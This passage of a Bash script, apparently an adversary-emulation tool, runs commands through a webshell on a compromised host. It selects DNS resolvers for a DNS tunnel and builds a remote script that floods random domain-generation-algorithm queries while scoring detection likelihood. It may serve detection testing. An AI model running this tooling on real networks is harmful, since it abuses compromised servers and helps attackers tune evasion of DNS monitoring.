    out=$(run_webshell_quick "dns-upstream-discover" "$(build_discover_dns_upstream_remote_cmd)" 2>/dev/null || true)
    read -r resolver_source stub_resolver upstream_dns upstream_all <<< "$(parse_dns_resolver_probe_line "${out}" 2>/dev/null || true)"
    DNS_RESOLVER_SOURCE="${resolver_source:-unknown}"
    DNS_STUB_RESOLVER="${stub_resolver:-}"
    DNS_UPSTREAM_DNS=$(poc_extract_ipv4 "${upstream_dns}")
    if [[ -n "${upstream_all}" ]]; then
        local IFS=','
        for host in ${upstream_all}; do
            host=$(poc_extract_ipv4 "${host}")
            [[ -z "${host}" ]] && continue
            dns_resolver_is_stub "${host}" && continue
            printf '%s\n' "${host}"
        done
        return 0
    fi
    host=$(poc_extract_ipv4 "${upstream_dns}")
    if [[ -n "${host}" ]] && ! dns_resolver_is_stub "${host}"; then
        printf '%s\n' "${host}"
    fi
}

discover_dns_resolver_from_webshell() {
    discover_dns_upstream_from_webshell | awk 'NF {print; exit}'
}

log_dns_resolver_discovery() {
    local msg="DNS_RESOLVER_DISCOVERY resolver_source=${DNS_RESOLVER_SOURCE:-unknown} stub_resolver=${DNS_STUB_RESOLVER:-} upstream_dns=${DNS_UPSTREAM_DNS:-} selected_dns=${DNS_SELECTED_DNS:-} reason=${DNS_RESOLVER_REASON:-unknown}"
    state_append "dns_resolver_discovery.log" "${msg}"
    append_dns_tunnel_wave_log "${msg}"
    log_message "OK" "${msg}" >&2
}

log_dns_resolver_selected() {
    local resolver="$1" source="$2" validated="$3"
    local resolver_type="forwarder"
    local upstream_unknown="yes"
    case "${source}" in
        scan) resolver_type="forwarder" ;;
        systemd-resolved|resolver) resolver_type="forwarder" ;;
        user|fallback) resolver_type="resolver" ;;
    esac
    [[ "${resolver_type}" == "resolver" ]] && upstream_unknown="no"
    DNS_RESOLVER_SELECTED_TYPE="${resolver_type}"
    DNS_FORWARDER_MODE_UPSTREAM_UNKNOWN="${upstream_unknown}"
    local selected_msg="DNS_RESOLVER_SELECTED resolver=${resolver} resolver_type=${resolver_type} validation_result=${validated} source=${source}"
    local fw_msg="DNS_FORWARDER_MODE resolver=${resolver} resolver_type=${resolver_type} upstream_unknown=${upstream_unknown}"
    state_append "dns_resolver_discovery.log" "${selected_msg}"
    state_append "dns_resolver_discovery.log" "${fw_msg}"
    dns_tunnel_log_both "${selected_msg}"
    dns_tunnel_log_both "${fw_msg}"
}

select_dns_tunnel_target() {
    local scan_hosts target="" source="" detail="" host fallback_hosts="" resolver_source=""
    local validated_target="" scan_fallback="" upstream_host validated=false
    DNS_TUNNEL_FALLBACK_RESOLVER=false
    DNS_TUNNEL_SKIP_REASON=""
    DNS_STUB_RESOLVER=""
    DNS_UPSTREAM_DNS=""
    DNS_RESOLVER_SOURCE=""
    DNS_RESOLVER_REASON=""
    DNS_SELECTED_DNS=""

    scan_hosts=$(discover_dns_servers_from_scan)
    while IFS= read -r host; do
        [[ -z "${host}" ]] && continue
        host=$(poc_extract_ipv4 "${host}")
        [[ -z "${host}" ]] && continue
        dns_resolver_is_stub "${host}" && continue
        [[ -z "${scan_fallback}" ]] && scan_fallback="${host}"
        if [[ -z "${validated_target}" ]] && validate_dns_server_remote "${host}" "scan"; then
            validated_target="${host}"
        fi
    done <<< "${scan_hosts}"

    if [[ -n "${validated_target}" ]]; then
        target="${validated_target}"
        source="scan"
        detail="target-net DNS server from dns_hosts.txt/usable_dns_hosts.txt (query-validated)"
        DNS_RESOLVER_REASON="target_net_dns_validated"
        validated=true
    elif [[ -n "${scan_fallback}" ]]; then
        target="${scan_fallback}"
        source="scan"
        detail="target-net DNS server from dns_hosts.txt/usable_dns_hosts.txt"
        DNS_RESOLVER_REASON="target_net_dns_discovered"
        validate_dns_server_remote "${target}" "scan" >/dev/null 2>&1 || true
    fi

    if [[ -z "${target}" ]]; then
        while IFS= read -r upstream_host; do
            [[ -z "${upstream_host}" ]] && continue
            upstream_host=$(poc_extract_ipv4 "${upstream_host}")
            [[ -z "${upstream_host}" ]] && continue
            dns_resolver_is_stub "${upstream_host}" && continue
            [[ -z "${DNS_UPSTREAM_DNS}" ]] && DNS_UPSTREAM_DNS="${upstream_host}"
            if [[ -z "${target}" ]]; then
                target="${upstream_host}"
                source="systemd-resolved"
                detail="upstream DNS from resolvectl (stub ${DNS_STUB_RESOLVER:-127.0.0.53} excluded)"
                DNS_RESOLVER_REASON="using_upstream_resolver"
                DNS_TUNNEL_FALLBACK_RESOLVER=true
            fi
            if validate_dns_server_remote "${upstream_host}" "resolver"; then
                target="${upstream_host}"
                source="systemd-resolved"
                detail="upstream DNS from resolvectl (query-validated; stub excluded)"
                DNS_RESOLVER_REASON="using_upstream_resolver_validated"
                DNS_UPSTREAM_DNS="${upstream_host}"
                validated=true
                break
            fi
        done < <(discover_dns_upstream_from_webshell)
    fi

    if [[ -z "${target}" ]]; then
        fallback_hosts="${DNS_TUNNEL_USER_SERVER} 8.8.8.8"
        for host in ${fallback_hosts}; do
            [[ -z "${host}" ]] && continue
            host=$(poc_extract_ipv4 "${host}")
            [[ -z "${host}" ]] && continue
            dns_resolver_is_stub "${host}" && continue
            target="${host}"
            if [[ "${host}" == "${DNS_TUNNEL_USER_SERVER}" ]]; then
                source="user"
                detail="operator --dns-server"
                DNS_RESOLVER_REASON="operator_dns_server"
            else
                source="fallback"
                detail="default public resolver"
                DNS_RESOLVER_REASON="public_fallback_resolver"
            fi
            DNS_TUNNEL_FALLBACK_RESOLVER=true
            if validate_dns_server_remote "${host}" "${source}"; then
                DNS_RESOLVER_REASON="${DNS_RESOLVER_REASON}_validated"
                validated=true
            else
                DNS_RESOLVER_REASON="${DNS_RESOLVER_REASON}_validation_failed_continuing"
            fi
            break
        done
    fi

    if [[ -z "${target}" ]]; then
        DNS_TARGET_SERVER=""
        DNS_TARGET_SELECTION_SOURCE=""
        DNS_TARGET_SELECTION_DETAIL=""
        DNS_TUNNEL_SELECTED_RESOLVER=""
        DNS_TUNNEL_RESOLVER_SOURCE=""
        DNS_TUNNEL_SKIP_REASON="dns_server_validation_failed"
        DNS_RESOLVER_REASON="no_resolver_available"
        log_dns_resolver_discovery
        dns_tunnel_log_both "skip reason=dns_server_validation_failed"
        log_message "WARN" "DNS resolver discovery failed — no non-stub resolver available" >&2
        return 1
    fi

    if [[ "${validated}" != true && "${DNS_RESOLVER_REASON}" != *"_continuing"* ]]; then
        DNS_RESOLVER_REASON="${DNS_RESOLVER_REASON}_validation_failed_continuing"
    fi

    if [[ -z "${DNS_STUB_RESOLVER}" ]]; then
        discover_dns_upstream_from_webshell >/dev/null || true
    fi

    resolver_source=$(dns_tunnel_map_selection_source "${source}")
    DNS_TARGET_SERVER="${target}"
    DNS_SELECTED_DNS="${target}"
    DNS_TARGET_SELECTION_SOURCE="${source}"
    DNS_TARGET_SELECTION_DETAIL="${detail}"
    DNS_TUNNEL_SELECTED_RESOLVER="${target}"
    DNS_TUNNEL_RESOLVER_SOURCE="${resolver_source}"
    DNS_TUNNEL_SKIP_REASON=""
    log_dns_resolver_discovery
    log_dns_tunnel_selected_resolver "${target}" "${resolver_source}" "${detail}"
    log_dns_resolver_selected "${target}" "${source}" "${DNS_RESOLVER_VALIDATION_RESULT:-failed}"
    if [[ "${DNS_TUNNEL_FALLBACK_RESOLVER}" == true ]]; then
        dns_tunnel_log_both "fallback_resolver active source=${resolver_source} server=${target} reason=${DNS_RESOLVER_REASON}"
    fi
    dns_tunnel_log_both "target_selection source=${source} resolver_source=${resolver_source} server=${target} detail=${detail} fallback_resolver=${DNS_TUNNEL_FALLBACK_RESOLVER}"
    log_message "OK" "DNS target selection: source=${resolver_source} server=${target} (${detail})" >&2
    printf '%s' "${target}"
}

resolve_dns_tunnel_query_tool() {
    DNS_TUNNEL_QUERY_TOOL=""
    DNS_TUNNEL_SKIP_REASON=""
    if [[ "${HAS_dig:-false}" == true ]]; then
        DNS_TUNNEL_QUERY_TOOL="dig"
        return 0
    fi
    if [[ "${HAS_nslookup:-false}" == true ]]; then
        DNS_TUNNEL_QUERY_TOOL="nslookup"
        return 0
    fi
    if [[ "${HAS_host:-false}" == true ]]; then
        DNS_TUNNEL_QUERY_TOOL="host"
        return 0
    fi
    if [[ "${HAS_python3:-false}" == true ]]; then
        DNS_TUNNEL_QUERY_TOOL="python3"
        return 0
    fi
    DNS_TUNNEL_SKIP_REASON="dig/nslookup/host/python3 unavailable on webshell host"
    return 1
}

append_dga_simulation_log() {
    local msg="$1"
    mkdir -p "${LOG_DIR}"
    printf '%s\n' "[$(date '+%Y-%m-%d %H:%M:%S')] cycle=${CURRENT_CYCLE:-1} ${msg}" >> "${LOG_DIR}/dga_simulation.log"
}

dga_simulation_log_both() {
    local msg="$1"
    append_dga_simulation_log "${msg}"
    state_append "dga_simulation.log" "cycle=${CURRENT_CYCLE:-1} ${msg}"
    log_message "OK" "${msg}" >&2
}

webshell_chunk_debug_tail() {
    local out="$1" max_bytes="${2:-500}"
    printf '%s' "${out}" | tr -d '\r' | tail -c "${max_bytes}" | tr '\n' ' ' | sed 's/  */ /g'
}

log_webshell_chunk_debug() {
    local tag="$1" chunk="$2" out="$3" reason="${4:-unknown}"
    local http_status="${WEBSHELL_LAST_HTTP_CODE:-000}"
    local exit_code="${WEBSHELL_LAST_EXIT_CODE:-}"
    local response_bytes="${#out}"
    local stdout_tail stderr_tail msg=""
    stdout_tail=$(webshell_chunk_debug_tail "${out}" 500)
    stderr_tail=$(printf '%s' "${out}" | tr -d '\r' | grep -iE 'error|fail|denied|timeout|refused|not found' | tail -n3 | tr '\n' ' ' | head -c 300)
    [[ -z "${exit_code}" ]] && exit_code=$(sed -n 's/.*__EXIT_CODE:\([0-9][0-9]*\).*/\1/p' <<< "${out}" | tail -n1)
    [[ -z "${exit_code}" ]] && exit_code="n/a"
    msg="${tag} chunk=${chunk} http_status=${http_status} exit_code=${exit_code} response_bytes=${response_bytes} stdout_tail=${stdout_tail} stderr_tail=${stderr_tail} reason=${reason}"
    case "${tag}" in
        DNS_ENHANCED_CHUNK_DEBUG|DNS_TUNNEL_ENHANCED_CHUNK_DEBUG)
            dns_tunnel_log_both "${msg}"
            ;;
        DGA_CHUNK_DEBUG)
            dga_simulation_log_both "${msg}"
            ;;
        *)
            log_message "OK" "${msg}" >&2
            ;;
    esac
}

resolve_dga_query_tool() {
    DGA_QUERY_TOOL=""
    DGA_SKIP_REASON=""
    if [[ "${HAS_dig:-false}" == true ]]; then
        DGA_QUERY_TOOL="dig"
        return 0
    fi
    if [[ "${HAS_nslookup:-false}" == true ]]; then
        DGA_QUERY_TOOL="nslookup"
        return 0
    fi
    if [[ "${HAS_host:-false}" == true ]]; then
        DGA_QUERY_TOOL="host"
        return 0
    fi
    if [[ "${HAS_getent:-false}" == true ]]; then
        DGA_QUERY_TOOL="getent"
        return 0
    fi
    if [[ "${HAS_python3:-false}" == true ]]; then
        DGA_QUERY_TOOL="python3"
        return 0
    fi
    DGA_QUERY_TOOL="dig"
    DGA_SKIP_REASON=""
    dga_simulation_log_both "DGA query tool fallback: assuming dig on webshell host (preflight may have confirmed DNS)"
    return 0
}

dga_ensure_resolver() {
    local picked=""
    picked=$(select_dga_dns_resolver) || picked=""
    if [[ -z "${picked}" || "${picked}" == none ]]; then
        dga_select_system_resolver_mode
        picked="system"
    fi
    if [[ "${picked}" != system ]]; then
        picked=$(poc_extract_ipv4 "${picked}")
        [[ -z "${picked}" ]] && {
            dga_select_system_resolver_mode
            picked="system"
        }
    fi
    printf '%s' "${picked}"
}

dga_validate_system_resolver_remote() {
    local out="" tool="${DGA_QUERY_TOOL:-dig}"
    if [[ "${DRY_RUN}" == true ]]; then
        return 0
    fi
    case "${tool}" in
        dig)
            out=$(run_webshell_quick "dga-sys-resolver-probe" \
                "dig +time=2 +tries=1 +noall +answer poc-lab-dga-probe.invalid A 2>&1 | head -n 5" 2>/dev/null || true)
            ;;
        nslookup)
            out=$(run_webshell_quick "dga-sys-resolver-probe" \
                "nslookup -timeout=2 poc-lab-dga-probe.invalid 2>&1 | head -n 5" 2>/dev/null || true)
            ;;
        host)
            out=$(run_webshell_quick "dga-sys-resolver-probe" \
                "host -W 2 poc-lab-dga-probe.invalid 2>&1 | head -n 5" 2>/dev/null || true)
            ;;
        getent)
            out=$(run_webshell_quick "dga-sys-resolver-probe" \
                "getent ahostsv4 poc-lab-dga-probe.invalid 2>&1 | head -n 5" 2>/dev/null || true)
            ;;
        *) return 1 ;;
    esac
    [[ -n "${out}" ]] && printf '%s' "${out}" | grep -qiE 'NXDOMAIN|not found|can.t find|SERVFAIL|timed out|no servers|connection refused|Host not found'
}

dga_select_system_resolver_mode() {
    discover_dns_upstream_from_webshell >/dev/null 2>&1 || true
    DGA_DNS_SERVER="system"
    DGA_DNS_SOURCE="system_resolver"
    DGA_DNS_DETAIL="system resolver (dig/nslookup without @server; stub=${DNS_STUB_RESOLVER:-n/a} upstream=${DNS_UPSTREAM_DNS:-n/a})"
    log_dga_resolver_discovery "system" "${DGA_DNS_DETAIL}"
    dga_simulation_log_both "DGA resolver mode=system_resolver stub=${DNS_STUB_RESOLVER:-} upstream=${DNS_UPSTREAM_DNS:-}"
    printf '%s' "system"
}

select_dga_dns_resolver() {
    local scan_hosts target="" source="" detail="" host user_srv="" scan_fallback="" validated_target=""
    DGA_SKIP_REASON=""
    user_srv="${DGA_DNS_USER_SERVER}"

    scan_hosts=$(discover_dns_servers_from_scan)
    while IFS= read -r host; do
        [[ -z "${host}" ]] && continue
        host=$(poc_extract_ipv4 "${host}")
        [[ -z "${host}" ]] && continue
        dns_resolver_is_stub "${host}" && continue
        [[ -z "${scan_fallback}" ]] && scan_fallback="${host}"
        if [[ -z "${validated_target}" ]] && validate_dns_server_remote "${host}" "dga-scan"; then
            validated_target="${host}"
        fi
    done <<< "${scan_hosts}"

    if [[ -n "${validated_target}" ]]; then
        target="${validated_target}"
        source="scan"
        detail="target-net DNS from dns_hosts.txt (query-validated)"
    elif [[ -n "${scan_fallback}" ]]; then
        target="${scan_fallback}"
        source="scan"
        detail="target-net DNS from dns_hosts.txt"
        validate_dns_server_remote "${target}" "dga-scan" >/dev/null 2>&1 || true
    fi

    if [[ -z "${target}" ]]; then
        while IFS= read -r host; do
            [[ -z "${host}" ]] && continue
            host=$(poc_extract_ipv4 "${host}")
            [[ -z "${host}" ]] && continue
            dns_resolver_is_stub "${host}" && continue
            [[ -z "${DNS_UPSTREAM_DNS}" ]] && discover_dns_upstream_from_webshell >/dev/null || true
            target="${host}"
            source="systemd-resolved"
            detail="upstream DNS from resolvectl (stub excluded)"
            if validate_dns_server_remote "${host}" "dga-resolver"; then
                detail="upstream DNS from resolvectl (query-validated; stub excluded)"
                break
            fi
        done < <(discover_dns_upstream_from_webshell)
    fi

    if [[ -z "${target}" && -n "${user_srv}" ]]; then
        host=$(poc_extract_ipv4 "${user_srv}")
        if [[ -n "${host}" ]] && ! dns_resolver_is_stub "${host}"; then
            target="${host}"
            source="user"
            detail="operator --dga-dns-server"
            validate_dns_server_remote "${host}" "dga-user" >/dev/null 2>&1 || true
        fi
    fi

    if [[ -z "${target}" ]]; then
        dga_select_system_resolver_mode
        return 0
    fi
    if ! validate_dns_server_remote "${target}" "dga-preflight"; then
        dga_simulation_log_both "DGA explicit resolver ${target} validation failed; falling back to system resolver"
        dga_select_system_resolver_mode
        return 0
    fi
    DGA_DNS_SERVER="${target}"
    DGA_DNS_SOURCE="${source}"
    DGA_DNS_DETAIL="${detail}"
    log_dga_resolver_discovery "${target}" "${detail}"
    dga_simulation_log_both "DGA resolver selected server=${target} source=${source} detail=${detail}"
    printf '%s' "${target}"
}

log_dga_resolver_discovery() {
    local selected="${1}" reason="${2:-${DGA_DNS_DETAIL:-unknown}}"
    local resolver_label="${selected}"
    [[ "${selected}" == system || -z "${selected}" || "${selected}" == none ]] && resolver_label="system"
    [[ -z "${DGA_DNS_SOURCE}" ]] && DGA_DNS_SOURCE="system_resolver"
    local msg="DGA_RESOLVER_DISCOVERY resolver=${resolver_label} source=${DGA_DNS_SOURCE:-system_resolver} stub_resolver=${DNS_STUB_RESOLVER:-} upstream_dns=${DNS_UPSTREAM_DNS:-} selected_dns=${resolver_label} reason=${reason}"
    state_append "dga_resolver_discovery.log" "${msg}"
    append_dga_simulation_log "${msg}"
    log_message "OK" "${msg}" >&2
}

log_dga_simulation_summary() {
    local msg="DGA_SIMULATION_SUMMARY queries=${DGA_TOTAL_QUERIES} nxdomain=${DGA_NXDOMAIN_COUNT} resolvable=${DGA_RESOLVED_COUNT} resolver=${DGA_DNS_SERVER:-} source=${DGA_DNS_SOURCE:-unknown}"
    dga_simulation_log_both "${msg}"
}

dga_compute_detection_likelihood() {
    local total="$1" nx="$2" resolved="$3" same_etld="$4"
    local entropy="${5:-${DGA_ENTROPY_SCORE:-0}}"
    local sent random_domains
    DGA_DETECTION_LIKELIHOOD="LOW"
    DGA_DETECTION_REASON=""
    entropy=$(safe_int "${entropy}")
    total=$(safe_int "${total}")
    nx=$(safe_int "${nx}")
    resolved=$(safe_int "${resolved}")
    sent=$(safe_int "${DGA_QUERY_SENT_COUNT:-0}")
    random_domains=$(safe_int "${DGA_ACTUAL_RANDOM_DOMAINS:-0}")
    if (( entropy >= 45 && sent >= 150 && nx >= 150 && random_domains >= 150 )); then
        DGA_DETECTION_LIKELIHOOD="HIGH"
        DGA_DETECTION_REASON="seed_dga_entropy>=4.5 nxdomain_burst random_domain_burst"
        return 0
    fi
    if (( total >= 103 && nx >= 80 && sent >= 80 )) && [[ "${same_etld}" == yes ]]; then
        DGA_DETECTION_LIKELIHOOD="HIGH"
        DGA_DETECTION_REASON="nxdomain_burst+resolvable_same_tld"
        return 0
    fi
    if (( entropy >= 30 && total >= 50 && nx >= 40 )); then
        DGA_DETECTION_LIKELIHOOD="MEDIUM"
        DGA_DETECTION_REASON="partial_dga_entropy_pattern"
        return 0
    fi
    if (( total >= 103 && nx >= 50 && resolved >= 1 )); then
        DGA_DETECTION_LIKELIHOOD="MEDIUM"
        DGA_DETECTION_REASON="partial_dga_pattern"
        return 0
    fi
    DGA_DETECTION_REASON="insufficient_nxdomain_volume_or_resolvable_followup"
}

dga_apply_stage_final_summary_from_line() {
    local line="$1"
    [[ -z "${line}" ]] && return 1
    DGA_TOTAL_QUERIES=$(safe_int "$(dns_stats_field_from_line "${line}" queries)")
    DGA_NXDOMAIN_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" nxdomain)")
    DGA_RESOLVED_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" resolved)")
    DGA_QUERIES_ATTEMPTED="${DGA_TOTAL_QUERIES}"
    DGA_QUERIES_SENT="${DGA_TOTAL_QUERIES}"
    return 0
}

dga_apply_summary_from_line() {
    local line="$1" queries="" nx="" resolvable=""
    queries=$(dns_stats_field_from_line "${line}" queries)
    nx=$(dns_stats_field_from_line "${line}" nxdomain)
    resolvable=$(dns_stats_field_from_line "${line}" resolvable)
    [[ -z "${queries}" ]] && queries=$(dns_stats_field_from_line "${line}" total_queries)
    [[ -z "${nx}" ]] && nx=$(dns_stats_field_from_line "${line}" nxdomain_count)
    [[ -z "${resolvable}" ]] && resolvable=$(dns_stats_field_from_line "${line}" resolved_count)
    DGA_TOTAL_QUERIES=$(safe_int "${queries}")
    DGA_NXDOMAIN_COUNT=$(safe_int "${nx}")
    DGA_RESOLVED_COUNT=$(safe_int "${resolvable}")
    DGA_TIMEOUT_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" timeout_count)")
    DGA_ERROR_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" error_count)")
    DGA_SAME_EFFECTIVE_TLD=$(dns_stats_field_from_line "${line}" same_effective_tld)
    DGA_DETECTION_LIKELIHOOD=$(dns_stats_field_from_line "${line}" detection_likelihood)
    DGA_DETECTION_REASON=$(dns_stats_field_from_line "${line}" reason)
    DGA_GENERATED_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" generated)")
    DGA_ENTROPY_SCORE=$(safe_int "$(dns_stats_field_from_line "${line}" entropy)")
    (( DGA_GENERATED_COUNT < 1 )) && DGA_GENERATED_COUNT="${DGA_TOTAL_QUERIES}"
    [[ -z "${DGA_SAME_EFFECTIVE_TLD}" ]] && DGA_SAME_EFFECTIVE_TLD="yes"
    [[ -z "${DGA_DETECTION_LIKELIHOOD}" ]] && DGA_DETECTION_LIKELIHOOD="LOW"
}

dga_accumulate_chunk_summary() {
    local line="$1"
    local q="" nx="" res="" to="" err=""
    q=$(safe_int "$(dns_stats_field_from_line "${line}" queries)")
    nx=$(safe_int "$(dns_stats_field_from_line "${line}" nxdomain)")
    res=$(safe_int "$(dns_stats_field_from_line "${line}" resolvable)")
    to=$(safe_int "$(dns_stats_field_from_line "${line}" timeout_count)")
    err=$(safe_int "$(dns_stats_field_from_line "${line}" error_count)")
    DGA_TOTAL_QUERIES=$((DGA_TOTAL_QUERIES + q))
    DGA_NXDOMAIN_COUNT=$((DGA_NXDOMAIN_COUNT + nx))
    DGA_RESOLVED_COUNT=$((DGA_RESOLVED_COUNT + res))
    DGA_TIMEOUT_COUNT=$((DGA_TIMEOUT_COUNT + to))
    DGA_ERROR_COUNT=$((DGA_ERROR_COUNT + err))
}

dga_emit_aggregated_simulation_summary() {
    local resolver="$1" res_tld="$2"
    DGA_GENERATED_COUNT="${DGA_QUERY_GENERATED:-${DGA_TOTAL_QUERIES}}"
    dga_compute_detection_likelihood "${DGA_TOTAL_QUERIES}" "${DGA_NXDOMAIN_COUNT}" "${DGA_RESOLVED_COUNT}" "${DGA_SAME_EFFECTIVE_TLD:-yes}" "${DGA_ENTROPY_SCORE:-0}"
    local msg="DGA_SIMULATION_SUMMARY queries=${DGA_TOTAL_QUERIES} nxdomain=${DGA_NXDOMAIN_COUNT} resolvable=${DGA_RESOLVED_COUNT} resolver=${resolver} resolvable_tld=${res_tld} timeout_count=${DGA_TIMEOUT_COUNT} error_count=${DGA_ERROR_COUNT} same_effective_tld=${DGA_SAME_EFFECTIVE_TLD:-yes} detection_likelihood=${DGA_DETECTION_LIKELIHOOD} reason=${DGA_DETECTION_REASON} query_generated=${DGA_QUERY_GENERATED:-0} query_sent=${DGA_QUERY_SENT_COUNT:-0} query_responded=${DGA_QUERY_RESPONDED_COUNT:-0} actual_dns_queries=${DGA_ACTUAL_DNS_QUERIES:-0} actual_random_domains=${DGA_ACTUAL_RANDOM_DOMAINS:-0} actual_nxdomain=${DGA_ACTUAL_NXDOMAIN:-0}"
    dga_simulation_log_both "${msg}"
    msg="DGA_SUMMARY generated=${DGA_GENERATED_COUNT} resolved=${DGA_RESOLVED_COUNT} nxdomain=${DGA_NXDOMAIN_COUNT} entropy=${DGA_ENTROPY_SCORE:-0} likelihood=${DGA_DETECTION_LIKELIHOOD} query_sent=${DGA_QUERY_SENT_COUNT:-0} query_responded=${DGA_QUERY_RESPONDED_COUNT:-0}"
    dga_simulation_log_both "${msg}"
}

dga_replay_structured_logs() {
    local out="$1" line
    while IFS= read -r line; do
        line=$(printf '%s' "${line}" | tr -d '\r')
        [[ -z "${line}" ]] && continue
        case "${line}" in
            DGA_SIMULATION_SUMMARY*|DGA_SUMMARY*)
                continue
                ;;
            DGA_SIMULATION_START*|DGA_PHASE_START*|DGA_NXDOMAIN_QUERY*|DGA_RESOLVABLE_QUERY*|DGA_DOMAIN_GENERATION*|DGA_NX_CHUNK_SUMMARY*|DGA_CHUNK_SUMMARY*|DGA_RESOLVER_DISCOVERY*|DNS_QUERY_GENERATED*|DNS_QUERY_SENT*|DNS_QUERY_RESPONSE*)
                dga_simulation_log_both "${line}"
                ;;
        esac
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DGA_' || true)"
}

build_dga_simulation_remote_cmd() {
    local resolver="$1" res_tld="$2" nx_count="$3" res_count="$4" tool="$5" enforce_minimums="${6:-yes}" chunk_idx="${7:-0}" chunk_fast="${8:-no}"
    nx_count=$(safe_int "${nx_count}")
    res_count=$(safe_int "${res_count}")
    if [[ "${enforce_minimums}" == yes ]]; then
        (( nx_count < 250 )) && nx_count=250
        (( nx_count > 300 )) && nx_count=300
        (( res_count < 5 )) && res_count=5
        (( res_count > 8 )) && res_count=8
    fi
    remote_bash_script_open 'DGA_SIM_SCRIPT'
    cat <<EOF
rand_bytes(){ n="\${1:-8}"; if [ -r /dev/urandom ]; then head -c "\$n" /dev/urandom 2>/dev/null; elif command -v openssl >/dev/null 2>&1; then openssl rand -hex "\$n" 2>/dev/null; else printf '%s%s' "\$RANDOM" "\$RANDOM"; fi; }
dga_rand_label(){ n="\${1:-20}"; s=\$(rand_bytes 16 2>/dev/null | tr -dc 'A-Za-z0-9' | head -c "\${n}" 2>/dev/null); [ -n "\$s" ] || s="poc\${RANDOM}"; printf '%s' "\$s"; }
dga_label_ent(){ lbl="\$1"; len=\${#lbl}; [ "\$len" -lt 1 ] && { printf '0'; return; }; u=\$(printf '%s' "\$lbl" | sed 's/./&\n/g' | sort -u | grep -c . 2>/dev/null || echo 1); sc=\$(( u * 100 / (len > 20 ? 20 : len) )); [ "\$len" -ge 18 ] && sc=\$((sc + 10)); printf '%s' "\$sc"; }
dga_gen_domain(){ lbl=\$(dga_rand_label \$((18 + RANDOM % 10))); sub=\$(dga_rand_label 8); printf '%s.%s.%s' "\$lbl" "\$sub" "\$(dga_pick_tld)"; }
dga_pick_tld(){ case \$((RANDOM % 3)) in 0) printf com;; 1) printf net;; *) printf org;; esac; }
dga_is_to(){ case "\$1" in *timed\ out*|*TIMEOUT*|*refused*|*unreachable*) return 0;; esac; return 1; }
dga_is_nx(){ case "\$1" in *NXDOMAIN*|*"not found"*|*"can't find"*) return 0;; esac; return 1; }
dga_query(){
  local q="\$1" typ="\$2" ph="\$3" out="" result="error" dig_rc=0 sent_ok=no phase_label="\$ph"
  dga_generated=\$((dga_generated + 1))
  if [ "\$ph" = nx ]; then random_domains=\$((random_domains + 1)); fi
  printf 'DNS_QUERY_GENERATED server=%s fqdn=%s qtype=%s phase=%s tool=%s\n' "\$srv" "\$q" "\$typ" "\$phase_label" "\${tool}"
  if [ "\$tool" = nslookup ]; then
    if [ "\$srv" = system ] || [ -z "\$srv" ]; then out=\$(nslookup -timeout=2 "\$q" 2>&1); else out=\$(nslookup -timeout=2 "\$q" "\$srv" 2>&1); fi
  elif [ "\$tool" = host ]; then
    if [ "\$srv" = system ] || [ -z "\$srv" ]; then out=\$(host -W 2 -t "\$typ" "\$q" 2>&1); else out=\$(host -W 2 -t "\$typ" "\$q" "\$srv" 2>&1); fi
  else
    if [ "\$srv" = system ] || [ -z "\$srv" ]; then out=\$(dig +time=2 +tries=1 "\$q" "\$typ" 2>&1); else out=\$(dig +time=2 +tries=1 @"\$srv" "\$q" "\$typ" 2>&1); fi
  fi
  dig_rc=\$?
  case "\$out" in
    *"dig: not found"*|*"nslookup: not found"*|*"host: not found"*|*"command not found"*)
      printf 'DNS_QUERY_SENT server=%s fqdn=%s qtype=%s phase=%s tool=%s exit_code=%s sent=no reason=tool_unavailable\n' "\$srv" "\$q" "\$typ" "\$phase_label" "\${tool}" "\$dig_rc"
      err_c=\$((err_c + 1)); result=error
      ;;
    *)
      sent_c=\$((sent_c + 1))
      printf 'DNS_QUERY_SENT server=%s fqdn=%s qtype=%s phase=%s tool=%s exit_code=%s\n' "\$srv" "\$q" "\$typ" "\$phase_label" "\${tool}" "\$dig_rc"
      if dga_is_to "\$out"; then to_c=\$((to_c + 1)); result=timeout
      elif dga_is_nx "\$out"; then nx_c=\$((nx_c + 1)); result=nxdomain
      elif printf '%s' "\$out" | grep -qiE 'IN[[:space:]]+(A|TXT)|has address|Address:'; then res_c=\$((res_c + 1)); [ "\$ph" = res ] && res_phase_c=\$((res_phase_c + 1)); result=resolved
      else err_c=\$((err_c + 1)); result=error; fi
      responded_c=\$((responded_c + 1))
      total=\$((total + 1))
      printf 'DNS_QUERY_RESPONSE server=%s fqdn=%s qtype=%s phase=%s result=%s tool=%s\n' "\$srv" "\$q" "\$typ" "\$phase_label" "\$result" "\${tool}"
      ;;
  esac
  if [ "\$ph" = nx ]; then echo "DGA_NXDOMAIN_QUERY query=\$q qtype=\$typ result=\$result"
  else echo "DGA_RESOLVABLE_QUERY query=\$q qtype=\$typ result=\$result"; fi
}
srv='${resolver}'
res_tld='${res_tld}'
nx_n=${nx_count}
res_n=${res_count}
tool='${tool}'
chunk_idx=${chunk_idx}
chunk_fast='${chunk_fast}'
total=0; nx_c=0; res_c=0; res_phase_c=0; to_c=0; err_c=0; sent_c=0; responded_c=0; random_domains=0; same_etld=yes; dga_generated=0; dga_ent=0
dga_chunk_sleep(){ if [ "\$chunk_fast" = yes ]; then sleep 0.01; else sleep "0.\$(printf '%02d' \$((3 + RANDOM % 18)))"; fi; }
echo "DGA_SIMULATION_START phase=1_nxdomain resolver=\$srv planned_nx=\$nx_n planned_resolvable=\$res_n"
if [ "\$nx_n" -gt 0 ]; then
  echo "DGA_PHASE_START phase=1 description=seed_dga count=\$nx_n"
  i=0
  while [ "\$i" -lt "\$nx_n" ]; do
    i=\$((i + 1)); q=\$(dga_gen_domain); dga_generated=\$((dga_generated + 1))
    dga_ent=\$((dga_ent + \$(dga_label_ent "\$(printf '%s' "\$q" | cut -d. -f1)")))
    if [ \$((i % 6)) -eq 0 ]; then dga_query "\$q" TXT nx; else dga_query "\$q" A nx; fi
    dga_chunk_sleep
  done
  echo "DGA_NX_CHUNK_SUMMARY chunk=\${chunk_idx} queries=\$total nxdomain=\$nx_c timeout=\$to_c error=\$err_c query_generated=\$dga_generated query_sent=\$sent_c query_responded=\$responded_c actual_random_domains=\$random_domains"
fi
EOF
    if (( res_count > 0 )); then
    cat <<'EOF'
dga_pick_resolvable(){
